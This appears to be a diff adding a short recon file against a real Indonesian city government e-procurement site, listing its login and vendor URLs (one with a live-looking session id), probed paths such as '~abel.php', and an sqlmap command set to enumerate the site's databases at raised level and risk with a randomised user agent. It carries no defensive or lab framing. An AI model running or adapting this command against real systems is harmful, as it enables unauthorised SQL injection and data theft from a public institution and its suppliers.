@@ -1,0 +1,8 @@
+http://lpse.pemkomedan.go.id/eproc/login.form
+http://lpse.pemkomedan.go.id/eproc/rekanan/main;jsessionid=srUUf0iuZUvC9Re33B92HmNV7_y3WLL5HHeCTnA8
+http://lpse.pemkomedan.go.id/eproc/rekanan/main;jsessionid=?
+http://lpse.pemkomedan.go.id/eproc/rekanan/lelangmain/4103308
+http://lpse.pemkomedan.go.id:80/eproc/rekanan/~abel.php
+http://lpse.pemkomedan.go.id/eproc/rekanan/thereIsNoWayThat-You-CanBeThere.php?=url
+
+sqlmap -u http://lpse.pemkomedan.go.id/eproc/rekanan/thereIsNoWayThat-You-CanBeThere.php?cat=1 --dbs --level 3 --risk 2 --random-agent
